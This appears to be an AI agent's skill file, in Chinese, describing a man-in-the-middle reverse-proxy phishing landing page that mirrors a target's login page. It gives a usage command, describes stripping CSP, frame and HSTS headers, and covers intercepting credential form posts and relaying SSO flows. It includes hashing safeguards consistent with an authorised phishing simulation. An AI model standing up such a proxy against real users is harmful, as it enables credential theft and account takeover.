---
name: landing-page
description: 反向代理着陆页 v2——处理 JS/SSO/多步登录/凭据拦截
---

# 着陆页(线三) v2 — 反向代理模式
[creates artifacts] 不再克隆 HTML——做 MITM 反向代理。

## 为什么反向代理(不是克隆)
克隆的 HTML:
- JS 不执行(登录按钮没反应)
- CSS/字体从 CDN 加载失败(页面裸奔)
- SSO 跳转链断裂(Okta/Azure AD 多步流走不通)
- CAPTCHA 加载不出
反向代理全部解决——浏览器看到的就是真实页面。

## phish-proxy.py 用法
```bash
phish-proxy.py serve --listen 0.0.0.0:80 \
    --target https://login.target-corp.com \
    --db <数据根>/tools/phish/track.json(缺省即此, 通常无需显式传)
```

## 核心行为
1. GET 请求 → 转发到目标 → 剥离 CSP/X-Frame-Options/HSTS
   → 注入追踪像素 → 返回
2. CSS/JS/图片/字体 → 全部从目标域加载(页面完整渲染)
3. POST 凭据表单 → 拦截:
   - SHA-256 哈希(email:password)——明文即毁
   - 只记录哈希+邮箱域+IP(不记明文密码)
   - 302 到 success 页
4. SSO 多步流 → 非凭据 POST 直接转发(CSRF token/握手正常)

## 凭据处理红线
- 明文密码在内存中存在 <1ms(读→哈希→丢弃)
- 数据库只有 cred_hash(16 hex chars)
- 报告只写提交率,不写具体凭据
